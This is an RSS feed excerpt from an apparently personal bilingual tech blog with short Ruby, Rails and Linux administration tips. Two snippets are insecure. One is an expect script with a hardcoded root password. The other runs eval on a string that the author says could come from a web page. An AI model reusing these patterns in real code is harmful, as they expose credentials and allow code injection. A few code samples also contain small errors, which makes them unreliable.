[2,3,4].insert(1, 'a') # =&amp;gt; [2,'a', 3, 4]

# in Rails
models = SomeModel.where(...)
models.insert(1,'b')  # wrong argument: 2 for 1 
models.to_a.insert(1,'b')  # good 
&lt;/pre&gt;</description>
      <pubDate>Thu, 09 Jan 2014 03:39:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/why-array-insert-not-works-in-rails</link>
    </item>
    <item>
      <title>mac上安装大菠萝3 （install diablo3 on Mac)</title>
      <description>&lt;p&gt;居然不是双击鼠标就可以安装的？ 要不要在MAC上发生这个事儿。。。&lt;/p&gt;
&lt;p&gt;(the background music is so worse than diablo1's )&lt;/p&gt;
&lt;p&gt;(in short: &amp;#160;chmod +x to this file:&amp;#160;Diablo-III-8370-enUS-Installer/Diablo III Setup.app/Contents/MacOS)&lt;/p&gt;
&lt;p&gt;1. 打開終端&lt;br /&gt;2. 使用CD命令到達Diablo-III-8370-enUS-Installer/Diablo III Setup.app/Contents/MacOS目錄. 如果不會使用cd命令, 在終端中使用&lt;br /&gt;help cd&lt;br /&gt;查看幫助.&lt;br /&gt;3. 使用chmod指令爲"Diablo III Setup"添加可執行屬性. 如果不會使用chmod命令, 在終端中使用&lt;br /&gt;man chmod&lt;br /&gt;查看幫助.&lt;br /&gt;4. 運行"Diablo III Setup".&lt;/p&gt;</description>
      <pubDate>Wed, 08 Jan 2014 11:45:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/install-diablo3-on-mac</link>
    </item>
    <item>
      <title>一个expect 的例子 (an expect example  )</title>
      <description>&lt;p&gt;expect是一个非常好用， 但是可读性很差的东西。 所以我把一个简单的例子记录在这里： (expect is an automation tool, it's quite useful, at the same time, it grammer is quite un-readable. here is an example: )&lt;/p&gt;
&lt;pre&gt;#expect 自动输入密码的脚本： （服务器地址是： 10.103.13.73, 用户名 root, 密码 redAPPLE'

#!/usr/bin/expect
set timeout 100
system echo 'password: redAPPLE'
spawn ssh root@10.103.13.73 -p 22022
expect password
send "redAPPLE\r"
interact 
&lt;/pre&gt;
&lt;p&gt;最后的那个interact 非常重要！ &amp;#160;任何一个都不可或缺。 &amp;#160; ( don't forget the last line! )&amp;#160;&lt;/p&gt;</description>
      <pubDate>Wed, 08 Jan 2014 10:45:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/expect-command-example</link>
    </item>
    <item>
      <title>FLUXBB中批量删除用户和垃圾文章的办法remove spam users from fluxBB</title>
      <description>&lt;p&gt;1. 搜索这个用户 （ 管理设置 -》 用户 -》 搜索， 使用 *这样的通配符)&amp;#160;
&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSImMjAxNC8wMS8wNy8yM180OV8wNl80MTZfc3RlcDEucG5nBjoGRVQ/step1.png" title="Step1" alt="Step1" rel="225x255" width="1366" height="768" /&gt;&lt;/p&gt;
&lt;p&gt;2. 得到了用户列表，注意下面的封禁或者删除按钮
&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSImMjAxNC8wMS8wNy8yM180OV8wN18xODNfc3RlcDIucG5nBjoGRVQ/step2.png" title="Step2" alt="Step2" rel="225x255" width="1366" height="768" /&gt;&lt;/p&gt;
&lt;p&gt;3. 选择封禁的时候，注意 要让 “同时阻止IP地址” 选择 是。&lt;img src="/system/images/BAhbBlsHOgZmSSImMjAxNC8wMS8wNy8yM180OV8wN182MTZfc3RlcDMucG5nBjoGRVQ/step3.png" title="Step3" alt="Step3" rel="225x255" width="1366" height="768" /&gt;&lt;/p&gt;
&lt;p&gt;4. 也可以直接删掉它们。&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSImMjAxNC8wMS8wNy8yM180OV8wOF8yNDNfc3RlcDUucG5nBjoGRVQ/step5.png" title="Step5" alt="Step5" rel="225x255" width="1366" height="768" /&gt;&lt;/p&gt;</description>
      <pubDate>Tue, 07 Jan 2014 23:48:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/remove-spam-users-from-fluxbb</link>
    </item>
    <item>
      <title>如何输入一段ruby代码然后执行它？(how to input a string of ruby code and execute the code)</title>
      <description>&lt;p&gt;there's a case that I have to input a string of ruby from console(or from even the web page) then execute it. here is the example: （如题。）&lt;/p&gt;

&lt;pre&gt;class UrlGenerator
    attr_accessor :urls
    def generate
        @urls = yield
    end 
end

puts "== input a block"
# input:  base_url = "/base" ;  switches = [1,2];     results = [] ;  switches.each { |i|   results &amp;lt;&amp;lt; "#{base_url}/#{i}"  };  results;
block_string = gets
puts "===== block_string: #{block_string}"
the_block = lambda{eval(block_string)}
puts "== the block: #{the_block}"
a = UrlGenerator.new
a.generate &amp;amp;the_block
puts "==== urls: #{a.urls.inspect}"

&lt;/pre&gt;

refer to: &lt;a href="http://siwei.me/blog/posts/block-basic-in-ruby" target="_blank"&gt;http://siwei.me/blog/posts/block-basic-in-ruby&lt;/a&gt;, &lt;a href="http://siwei.me/blog/posts/the-return-in-ruby" target="_blank"&gt;http://siwei.me/blog/posts/the-return-in-ruby&lt;/a&gt;</description>
      <pubDate>Sun, 05 Jan 2014 01:02:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/how-to-input-a-string-of-ruby-code-and-then-call-it</link>
    </item>
    <item>
      <title>ruby中的return ( the 'return' keyword in Ruby)</title>
      <description>&lt;p&gt;Ruby中的 return 还是有些学问的，平时用着看不出来，但是真到见真章的时候就考验功夫了：&lt;/p&gt;


&lt;p&gt;1. eval 中不能出现 return ,否则会报错 (LocalJumpError) &lt;/p&gt;
&lt;p&gt;2. Proc.new 中不能出现return, 出错也是 LocalJumpError &lt;/p&gt;
&lt;p&gt;3. lambda中可以return .  在caller method中之后继续执行&lt;/p&gt;
&lt;p&gt;4. 总则：  在ruby的某个方法中：如果最后一句不写return, 那么也默认return 它。&lt;/p&gt;

&lt;pre&gt;examples: 
def give_me
   # return "your money"
  "your money"  
end

eval "1+1" #=&amp;gt; 2
eval "a = 1+1; return a" # =&amp;gt; LocalJumpError

&lt;/pre&gt;
see also: &lt;a href="http://siwei.me/blog/posts/lambda-v-s-proc-new" target="_blank"&gt; http://siwei.me/blog/posts/lambda-v-s-proc-new &lt;/a&gt;</description>
      <pubDate>Sun, 05 Jan 2014 00:55:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/the-return-in-ruby</link>
    </item>
    <item>
      <title>lambda v.s. Proc.new (lambda 与 proc的区别）</title>
      <description>&lt;p&gt;refer to: &amp;lt;&amp;lt;metaprogramming ruby&amp;gt;&amp;gt;, page 108~113.&lt;/p&gt;
&lt;p&gt;1. lambda中可以有显式的return , Proc不行。前者表示仅仅从当前的lambda中返回，而后者会出错 ( you can write return in lambda , but not in Proc.new. the former means return from a lambda an continue execute the code in the caller, but the latter means just return from the caller and will cause an error ) 
the root cause is:  
&lt;/p&gt;
&lt;pre&gt;def double callable_object
  callable_object.call * 2
end

my_block = lambda { return 10 }
double my_block # =&amp;gt; 20  

my_proc = Proc.new { 10 }
double my_proc # =&amp;gt; OK, 20 

error_proc = Proc.new { return 10 }
double my_proc # =&amp;gt;   unexpected return (LocalJumpError) 
&lt;/pre&gt;

&lt;p&gt;2. 对于Arity 的处理不同.  如果传入的参数跟 block声明的参数数量不同的话，lambda直接报错，而proc会容错。( lambda raises error if the arity is not match, but the Proc.new won't )&amp;#160;&lt;/p&gt;
&lt;pre&gt;my_lambda = lambda { |x| return x }
my_lambda.call   # =&amp;gt; Argument Error,   0 for 1
my_lambda.call(10) # =&amp;gt; 10
my_lambda.call(10,20, 30 ) # =&amp;gt; Argument Error,   3 for 1

my_proc = Proc.new { |x| x }
my_proc.call  # =&amp;gt; nil
my_proc.call(10) # =&amp;gt; 10
my_proc.call(10,20) # =&amp;gt; 10
&lt;/pre&gt;</description>
      <pubDate>Sun, 05 Jan 2014 00:29:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/lambda-v-s-proc-new</link>
    </item>
    <item>
      <title>Block basic in Ruby( Block 基础 ）</title>
      <description>&lt;p&gt;以前虽然学习过block, proc, lambda, 但是一直没有大规模的使用。最近的项目让我不得不用到这个技术。但是遇到些问题。翻了书才知道原委。 (I have to review the 'block in Ruby' because of one of my projects)&lt;/p&gt;
&lt;p&gt;一个例子： (a concise example)&lt;/p&gt;
&lt;pre&gt;# no &amp;amp;param in this method declaration because of the "yield"
# 这个方法的参数声明中，没有 &amp;amp;param 。因为方法体中已经有了 "yield"
def math(a, b)  
    yield a,b 
end

def teach_match a, b, &amp;amp;operator  
  puts " let's do the math: "
  puts math a, b, &amp;amp;operator
end

teach_match(3, 5){ |x, y| x * y}  # =&amp;gt; 15&lt;/pre&gt;</description>
      <pubDate>Sun, 05 Jan 2014 00:16:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/block-basic-in-ruby</link>
    </item>
    <item>
      <title>web应用的稳定性是最重要的！( 24x7 online is the key for all the web-based applications)</title>
      <description>&lt;p&gt;前几天我的个人服务器当了。停了大约3天。这三天我着实感觉很难受。。。当一个点子需要记录下来的时候，没有地方可以写。( This blog server went down on last Friday. It's really a hard time for me)&lt;/span&gt;
&lt;/p&gt;&lt;p&gt;现在好了，有教训了。需要做的是： (so the lesson I have is: 1. backup in time, always. 2. &amp;#160;stabability is the most important )&lt;/span&gt;
&lt;/p&gt;&lt;p&gt;1。 及时备份&lt;/p&gt;
&lt;p&gt;2. &amp;#160;宁可功能少，也要稳定。 （彻底抛弃花生壳）&lt;/p&gt;
&lt;p&gt;之前虽然也用过花生壳，但是发现民用电根本不稳定啊！ 没有个持续供电的机器，我们民用的PC能连续开机一个月就不错了。虽然配置可以很高，但是只要用户有一次发现网站打不开，就会认为我们的网站已经关门大吉了。绝对的损失。 &amp;#160;( Though I have tried the "nut shell", it's not stable at all due to our "civil electricity". The users definitely think that our site is down forever when they found it down for 1 time. )&amp;#160;&lt;/p&gt;
&lt;p&gt;所以，从花生壳转向linode还是非常值得的。 ( I am happy with Linode now. )&lt;/p&gt;</description>
      <pubDate>Sat, 04 Jan 2014 00:14:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/always-online-is-the-most-important</link>
    </item>
    <item>
      <title>new feature in Rails4: Strong parameters (Rails4的新特性)</title>
      <description>&lt;p&gt;今天开始了一个RAILS4的项目。 扑面而来的一个特性： strong parameter( today I started my first Rails 4 project and met the "strong parameter" feater)&amp;#160;&lt;/p&gt;
&lt;p&gt;传统的rails 3 项目，需要在model中控制 可以访问的属性（in Rails 3, the attribute white list is controlled in model) ：&lt;/p&gt;
&lt;pre&gt;# in models
class Plan &amp;lt; ActiveRecord::Base
    attr_accessible :name, :schedule
end
&lt;/pre&gt;
&lt;p&gt; 在Rails 4中，需要在controller中进行控制： ( but in Rails4, it's controlled in controller )&amp;#160;&lt;/p&gt;
&lt;pre&gt;# in controller:
class PlansController &amp;lt; ApplicationController
  before_action :set_plan, only: [:update]
  def update
    if @plan.update plan_params
      redirect_to @plan, notice: 'Plan was successfully updated.'
    else
      render action: 'edit'
    end
  end
  private
    def set_plan
      @plan = Plan.find(params[:id])
    end 
    # this is the key! 
    def plan_params
      params.require(:plan).permit :name, :schedule
    end 
&lt;/pre&gt;</description>
      <pubDate>Mon, 23 Dec 2013 08:05:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rails4-strong-parameters</link>
    </item>
    <item>
      <title>使用不同版本的rails 来建立新项目 (create rails project with a specific rails version)</title>
      <description>&lt;p&gt;see: &lt;a href="http://stackoverflow.com/questions/379141/specifying-rails-version-to-use-when-creating-a-new-application" target="_blank"&gt;http://stackoverflow.com/questions/379141/specifying-rails-version-to-use-when-creating-a-new-application&lt;/a&gt; &amp;#160;&lt;/p&gt;
&lt;p&gt;$ gem list -l rails&amp;#160;&lt;/p&gt;
&lt;p&gt;# =&amp;gt; &amp;#160;3.0.1, 4.0.1, 4.0.0&lt;/p&gt;
&lt;p&gt;$ rails _3.0.1_ new my_blog&amp;#160;&lt;/p&gt;
&lt;p&gt;有趣的是， _3.0.1_ 是rubygem的用法，而不是rails 的用法。&amp;#160;&lt;/p&gt;</description>
      <pubDate>Mon, 23 Dec 2013 06:27:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/create-rails-project-using-specific-rails-version</link>
    </item>
    <item>
      <title>在ruby中模拟CLASS。 ( openstruct and struct in Ruby )</title>
      <description>&lt;p&gt;今天碰到一个困难，我想在gem 中调用另外一个项目的model. 可我又不想把那个项目的代码copy 过来，也不想用factory_girl, （太麻烦了）。 想到 delayed_job 中使用了struct 这个东东，所以我google了一下发现还有个 openstruct. &amp;#160; ( today I am trying to write the unit test code in a gem project, but the difficulty is I have to refer a model defined in another project. I don't want to write a explicit class for this model.... so I googled "ruby struct" around, and found there is also an 'openstruct' out there)&amp;#160;&lt;/p&gt;
&lt;p&gt;两个都可以用。&amp;#160;&lt;/p&gt;
&lt;pre&gt;require 'ostruct'
lala = OpenStruct(:name =&amp;gt; 'lala', :age =&amp;gt; 30)
lala.name #  =&amp;gt; 'lala'
lala.age   # =&amp;gt; 30

class Person &amp;lt; Struct.new(:name, :age)
end
girl = Person.new('lala', 30)
girl.name    # =&amp;gt; "lala"
girl.age  # =&amp;gt; 30
&lt;/pre&gt;
&lt;p&gt;

基本的区别是： open struct 更加方便，一行代码搞定 。 但是运行的速度比 struct 要慢上100倍。 (both of them are fine for unit test, but open struct is 100x slower than struct when initializing. refer to: ) 见这里：  &lt;a href="http://stackoverflow.com/questions/1177594/ruby-struct-vs-openstruct" target="_blank"&gt;http://stackoverflow.com/questions/1177594/ruby-struct-vs-openstruct&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Sat, 21 Dec 2013 06:19:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ruby-struct-vs-open-struct</link>
    </item>
    <item>
      <title>使用 jeweler 来管理/发布/建立你的rubygem ( using jeweler to manage your rubygem project) </title>
      <description>refer to: &lt;a href="https://github.com/technicalpickles/jeweler" target="_blank"&gt;https://github.com/technicalpickles/jeweler&lt;/a&gt; . 

TODO: finish this post. &lt;p&gt;经典方式请看这里：&amp;#160; &lt;a href="http://siwei.me/blog/posts/classic-way-to-publish-a-rubygem"&gt;http://siwei.me/blog/posts/classic-way-to-publish-a-rubygem&lt;/a&gt;
&lt;/p&gt; </description>
      <pubDate>Fri, 20 Dec 2013 03:34:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/use-jeweler-to-manage-your-gem-project</link>
    </item>
    <item>
      <title>经典方式发布一个rubygem (classic way to publish a rubygem ）</title>
      <description>&lt;p&gt;（ 如何写gem, 在这里 simplest gem guide here: &lt;a href="http://siwei.me/blog/posts/how-to-create-a-rubygem"&gt;how to create a gem &lt;/a&gt;&amp;#160; ）&amp;#160;&lt;/p&gt;
&lt;p&gt;1. 写好你的gem (finish your gem )&amp;#160;&lt;/p&gt;
&lt;p&gt;2.&amp;#160;gem build youku_video_utility.gemspec&lt;/p&gt;
&lt;p&gt;(确认你的credential 文件是正确的-- 登录rubygems.org之后，查看profile ) &amp;#160;(make sure your rubygem's credential file is there and mod is correct)&amp;#160;&lt;/p&gt;
&lt;p&gt;3.&amp;#160;gem push youku_video_utility-0.1.0.gem&lt;/p&gt;</description>
      <pubDate>Fri, 20 Dec 2013 03:31:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/classic-way-to-publish-a-rubygem</link>
    </item>
    <item>
      <title>安装nokogiri gem遇到错误。（error when installing nokogiri)</title>
      <description>&lt;p&gt;安装 nokogiri 时遇到了错误，参考这里：    &lt;a href="http://stackoverflow.com/questions/17914169/why-isnt-nokogiri-installing" target="_blank"&gt;http://stackoverflow.com/questions/17914169/why-isnt-nokogiri-installing&lt;/a&gt;
&lt;/p&gt;&lt;p&gt;

NOKOGIRI_USE_SYSTEM_LIBRARIES=1 bundle install&lt;/p&gt;</description>
      <pubDate>Thu, 19 Dec 2013 04:12:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/error-when-installing-nokogiri</link>
    </item>
    <item>
      <title>设置LINUX 的时区( set linux time zone) </title>
      <description>&lt;p&gt;很多时候，你的LINUX时间显示的不对，不是时间不对，而是时区错了。 &amp;#160;(most of the time, the root cause you found the time is not correct is that your linux is not setup with the correct timezone)&amp;#160;&lt;/p&gt;
&lt;p&gt;解决办法： for short: &amp;#160;&amp;#160;dpkg-reconfigure tzdata&lt;/p&gt;
&lt;p&gt;refer to:&amp;#160; &lt;a href="http://www.christopherirish.com/2012/03/21/how-to-set-the-timezone-on-ubuntu-server/" target="_blank"&gt;http://www.christopherirish.com/2012/03/21/how-to-set-the-timezone-on-ubuntu-server/&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;You can check your current timezone by just running&lt;/p&gt;
&lt;p&gt;$ date&lt;br /&gt;Thu Mar 21 18:02:49 MST 2012&lt;/p&gt;
&lt;p&gt;Or checking the timezone file at&lt;/p&gt;
&lt;p&gt;$ more /etc/timezone&lt;br /&gt;US/Arizona&lt;/p&gt;
&lt;p&gt;So to change it just run&lt;/p&gt;
&lt;p&gt;$ sudo dpkg-reconfigure tzdata&lt;br /&gt;And follow on screen instructions.  Easy.&lt;/p&gt;</description>
      <pubDate>Thu, 19 Dec 2013 03:42:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/set-linux-timezone</link>
    </item>
    <item>
      <title>(域名中A记录与CNAME的影响）domain names:  A record v.s. CNAME in nginx config</title>
      <description>&lt;p&gt;非常简单： 尽量使用A 记录，不要使用CNAME。 例如，为了让 www.siwei.me 和 siwei.me 都指向正常的地址。需要： &amp;#160;( if you are using godaddy's domain management, don't use CNAME for your www subname, always use A record for both '@' and 'www' sub names )&amp;#160;&lt;/p&gt;
&lt;p&gt;正确的： ( correct: )&amp;#160;&lt;/p&gt;
&lt;p&gt;A record: &amp;#160;@ =&amp;gt; &amp;#160;&amp;lt;your_host_ip&amp;gt;, &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;A record: &amp;#160;www =&amp;gt; &amp;lt;your_host_ip&amp;gt;&amp;#160;&lt;/p&gt;
&lt;p&gt;错误的： &amp;#160;( incorrect)&amp;#160;&lt;/p&gt;
&lt;p&gt;Arecord : @ =&amp;gt; &amp;lt;your_host_ip&amp;gt;&lt;/p&gt;
&lt;p&gt;CNAME: &amp;#160;www =&amp;gt; @&lt;/p&gt;</description>
      <pubDate>Mon, 16 Dec 2013 12:18:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/a-record-vs-cname-in-godaddy-domain-control</link>
    </item>
    <item>
      <title>E: Internal Error, No file name for libapt-pkg4.12</title>
      <description>&lt;p&gt;refer to:&amp;#160; &lt;a href="http://blog.khmersite.net/2013/10/e-internal-error-no-file-name-for-libapt-pkg4-12/"&gt;http://blog.khmersite.net/2013/10/e-internal-error-no-file-name-for-libapt-pkg4-12/&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;E: Internal Error, No file name for libapt-pkg4.12&lt;br /&gt;Leave a reply&lt;br /&gt;When I tried to update an Ubuntu (12.04) machine with the usual apt-get command, this error message came up:&lt;/p&gt;
&lt;p&gt;Do you want to continue [Y/n]? Y&lt;br /&gt;E: Internal Error, No file name for libapt-pkg4.12&lt;br /&gt;Reading this post (http://ubuntuforums.org/showthread.php?t=2045321), one way to fix it is to download liapt-pkg4.12 and re-install it:&lt;/p&gt;
&lt;p&gt;# apt-get download libapt-pkg4.12/precise-security&lt;br /&gt;# dpkg -i libapt-pkg4.12_0.8.16~exp12ubuntu10.10_amd64.deb&lt;/p&gt;</description>
      <pubDate>Thu, 12 Dec 2013 13:36:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/internal-error-no-file-name-for</link>
    </item>
    <item>
      <title>如何实现底部的斑马条( implement the striped title in bottom) </title>
      <description>&lt;p&gt;关键是： &amp;#160;在斑马条上面加一个 空白区域的 place holder div. 如下图的红色箭头部分 ( the key is: add a blank area as the "place holder" above the striped title area, show as below. )&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSI+MjAxMy8xMi8xMi8xNl8wMV8wMl80MzBfaG93X3RvX2ltcGxlbWVudF9zdHJpcGVfdGl0bGUucG5nBjoGRVQ/how_to_implement_stripe_title.png" title="How To Implement Stripe Title" alt="How To Implement Stripe Title" rel="225x255" width="695" height="332" /&gt;&lt;/p&gt;


代码如下：
&lt;pre&gt;&amp;lt;div&amp;gt;
    &amp;lt;div class="place_holder_above_striped_title" style="height: 100px; width: 200px"&amp;gt;
    &amp;lt;div style="background-color: black; opacity: 0.5; color: white; height: 20px"&amp;gt; some title in striped area 
&amp;lt;/div&amp;gt;
&lt;/pre&gt;</description>
      <pubDate>Thu, 12 Dec 2013 08:00:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/implement-striped-title-in-bottom</link>
    </item>
    <item>
      <title>解决 apt-get 失败引起的lock (remove lock file caused by broken apt-get install  )</title>
      <description>
&lt;pre&gt;rm /var/lib/dpkg/lock
rm /var/cache/apt/archives/lock
&lt;/pre&gt;</description>
      <pubDate>Thu, 12 Dec 2013 03:09:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/remove-lock-file-caused-by-broken-apt-get-install</link>
    </item>
    <item>
      <title>在新做的Linux系统上安装第三方包(install libs on bare linux)</title>
      <description>&lt;p&gt;参考：

&lt;a target="_blank" href="http://www.jasonrowland.com/2009/12/30/bare-ubuntu-configuration-for-ruby-on-rails/"&gt;http://www.jasonrowland.com/2009/12/30/bare-ubuntu-configuration-for-ruby-on-rails/&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt; on ubuntu&lt;/p&gt;
&lt;pre&gt;$ sudo apt-get install libapr1-dev libxml2-dev  libxslt-dev mysql-server libmysqlclient-dev
$ sudo apt-get install git curl build-essential libssl-dev libreadline-dev
$ sudo apt-get install libopenssl-ruby build-essential libssl-dev libreadline-dev vim&lt;/pre&gt;

&lt;h5&gt; on centus: &lt;/h5&gt;
&lt;pre&gt;$ yum install curl curl-devel zlib-devel openssl-devel cpio expat-devel gettext-devel
$ yum install bash curl git patch
$ yum install gcc-c++ patch readline readline-devel zlib zlib-devel libyaml-devel libffi-devel openssl-devel make bzip2 autoconf  automake libtool bison iconv-devel  bzip2-devel  libbz2-devel
&lt;/pre&gt;
&lt;p&gt;
install VIM, RUBY, gems: 
&lt;/p&gt;
&lt;pre&gt;$ git clone git://github.com/sstephenson/rbenv.git ~/.rbenv
echo 'export PATH="$HOME/.rbenv/bin:$PATH"' &amp;gt;&amp;gt; ~/.bashrc
echo 'eval "$(rbenv init -)"' &amp;gt;&amp;gt; ~/.bashrc
exec $SHELL -l
git clone git://github.com/sstephenson/ruby-build.git ~/.rbenv/plugins/ruby-build

$ git clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle&lt;/pre&gt;
&lt;p&gt;(more details for installing vim , check this out: &lt;a target="_blank" href="http://siwei.me/blog/posts/installing-vim-and-vundle"&gt;http://siwei.me/blog/posts/installing-vim-and-vundle&lt;/a&gt; )&lt;/p&gt;</description>
      <pubDate>Wed, 11 Dec 2013 07:15:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/install-libs-on-bare-linux</link>
    </item>
    <item>
      <title>使用mongoid 后无法generate migration ( can't involk rails g migration)</title>
      <description>&lt;p&gt;看这里有解决方案： ( see this post:&amp;#160; &lt;a href="http://stackoverflow.com/questions/6372626/using-active-record-generators-after-mongoid-installation"&gt;http://stackoverflow.com/questions/6372626/using-active-record-generators-after-mongoid-installation&lt;/a&gt;) &lt;/p&gt; 

&lt;pre&gt;$ rails g active_record:migration 
&lt;/pre&gt;
&lt;p&gt; 之所以会这样，是因为mongoid 一样会调用 rails g生成mongoid 需要的ORM MODEL. &amp;#160;( this is caused by mongoid's ORM strategy which would generate a model for mongoid but not ActiveRecord )&amp;#160;&lt;/p&gt; </description>
      <pubDate>Sun, 08 Dec 2013 06:23:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/using-active-record-generators-after-mongoid-installation</link>
    </item>
    <item>
      <title>godaddy会莫名其妙的修改你域名的A记录( your domain name would be modified by godaddy in some case) </title>
      <description>&lt;p&gt;很神奇， GODDAY 对域名的操作入口有两个， &amp;#160; ( it's very strange that there are 2 places that we could modify the settings )&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSI2MjAxMy8xMi8wNS8xOF80N18xMl84NzVfZ29kZGF5X2RvbWFpbl9zZXR0aW5nLnBuZwY6BkVU/godday_domain_setting.png" title="Godday Domain Setting" alt="Godday Domain Setting" rel="225x255" width="1280" height="800" /&gt;&lt;/p&gt;
&lt;p&gt;我们要总是编辑"Zone File" : &amp;#160;( we should always perform the edit operation in 'zone file editor' )&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSI3MjAxMy8xMi8wNS8xOF81Ml8xOV85NTZfZWRpdF9nb2RhZGR5X3pvbmVfZmlsZS5wbmcGOgZFVA/edit_godaddy_zone_file.png" title="Edit Godaddy Zone File" alt="Edit Godaddy Zone File" rel="225x255" width="1280" height="800" /&gt;&lt;/p&gt;</description>
      <pubDate>Thu, 05 Dec 2013 10:40:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/dont-let-godaddy-modify-your-domain-settings</link>
    </item>
    <item>
      <title>angular 的短板, rails 中UT的长处？( angular unit test v.s. rails UT's render_view)</title>
      <description>&lt;p&gt;用angular 做了3个项目（一个自己做，另外两个我带着项目组中其他人做）。 遇到的问题是： &amp;#160;( after 3 projects using angular, we met this problem: )&lt;/p&gt;
&lt;p&gt;随着项目的增长，自动化测试（单元测试/功能性测试） 越来越重要。 对model的测试不多， 因为model仅仅是对DB的封装。 而且没啥太多逻辑。 逻辑都集中在 lib 中（rails）， 出问题的地方主要集中在controller, view中。 ( in Rails, it's very easy to write an automation test testing both controller and view. but in Angular, because of the complete decouple, we have to write 2 kind of unit tests separately. )&lt;/p&gt;
&lt;p&gt;因为angular跟 后台程序解藕特别好，所以 无法运行一个测试，就又测angular， 又测后台接口。&lt;/p&gt;
&lt;p&gt;而RAILS就很简单了。 一个render_views 就可以 从controller 测试到 view.  例如： &amp;#160;(this is the rails' code: )&lt;/p&gt;
&lt;pre&gt;# -*- encoding : utf-8 -*-
require 'spec_helper'

describe PlansController do
  render_views
  before do
    request.env["HTTP_REFERER"] = root_path
    @plan = create(:plan)
  end 

  it 'should get index' do
    get :index
  end
end
&lt;/pre&gt;
&lt;p&gt;所以，目前看来，RAILS 这边还是很超前的。 耦合性虽然比 ANGULAR的大一些，但是从杠杆的角度讲，同学们觉得 使用RAILS更舒服一些，也容易坚持写单元测试（自动化测试） &amp;#160; &amp;#160;( as a concolusion, I think rails unit test is preferred by Chinese coder like us: we don't have the Agile environment and Agile management, &amp;#160;so maybe rails is more suitable for us ? )&amp;#160;&lt;/span&gt;
&lt;/p&gt;&lt;p&gt;&lt;/span&gt;
&lt;/p&gt;&lt;p&gt;&lt;/span&gt;
&lt;/p&gt;&lt;p&gt;&lt;/span&gt;
&lt;/p&gt;</description>
      <pubDate>Thu, 05 Dec 2013 10:19:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/angular-unit-test-vs-rails-unit-test</link>
    </item>
    <item>
      <title>reduce/inject 方法的用法（ the usage of reduce/inject in Ruby)</title>
      <description>&lt;p&gt;用了5年RUBY了，今天居然头一回遇到这个情况： &amp;#160; 需要对某个数组中的所有操作进行 &amp;#160; 的操作。 ( For the past years, I have not met this kind of questions until this morning, I need to loop all the elements of an array and return an result:  ) &lt;/p&gt;
&lt;pre&gt;current_element.product(next_element)
&lt;/pre&gt;
&lt;p&gt;搜索了一下， 应该使用 reduct/inject 方法.&amp;#160; ( after googling around, I found I should use the method: inject/reduce )&lt;/p&gt;
&lt;pre&gt;some_array = [1,2,3]
some_array.inject(0) { |memo, n| memo = memo + n}  # =&amp;gt; 0+6 = 6
&lt;/pre&gt;

see: &lt;a href="http://stackoverflow.com/questions/1538789/how-to-sum-array-members-in-ruby" target="_blank"&gt;http://stackoverflow.com/questions/1538789/how-to-sum-array-members-in-ruby&lt;/a&gt;</description>
      <pubDate>Tue, 03 Dec 2013 02:15:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/usage-of-inject-in-ruby</link>
    </item>
    <item>
      <title>gimp中如何画圆圈 （ how to draw circle in gimp)</title>
      <description>&lt;p&gt;Ellipse select tool &amp;gt; Start selecting &amp;gt; Hold down shift &amp;gt; Click on the circle to select it &amp;gt; Edit (Menu) &amp;gt; Stroke Selection - Voila!&lt;/p&gt;
&lt;p&gt;Alternative method: Select a circle again &amp;gt; Fill it &amp;gt; Select (menu) &amp;gt; Shrink few pixels &amp;gt; Delete&lt;/p&gt;</description>
      <pubDate>Fri, 29 Nov 2013 10:06:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/gimp-how-to-draw-circle-in-gimp</link>
    </item>
    <item>
      <title>安卓手机耗电特别快（媒体服务器） ( disable your sound/voice in your android settings ) </title>
      <description>&lt;p&gt;(short answer: disable the voice/sound from your screen touch operation-- in settings. &amp;#160;)&amp;#160;&lt;/p&gt;
&lt;p&gt;我的HUAWEI MATE一直用的好好的，但是最近发现电池消耗的特别快。 半小时耗电就24%了。&amp;#160;&lt;/p&gt;
&lt;p&gt;后来查看电池使用情况，发现是 媒体服务器耗电特别多。 （见截图）&lt;/p&gt;
&lt;p&gt;搜索了一下，把声音关掉就可以了。 &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;见：  &lt;a target="_blank" href="http://bbs.gfan.com/android-3579685-1-1.html"&gt;http://bbs.gfan.com/android-3579685-1-1.html&lt;/a&gt;
&lt;/p&gt; </description>
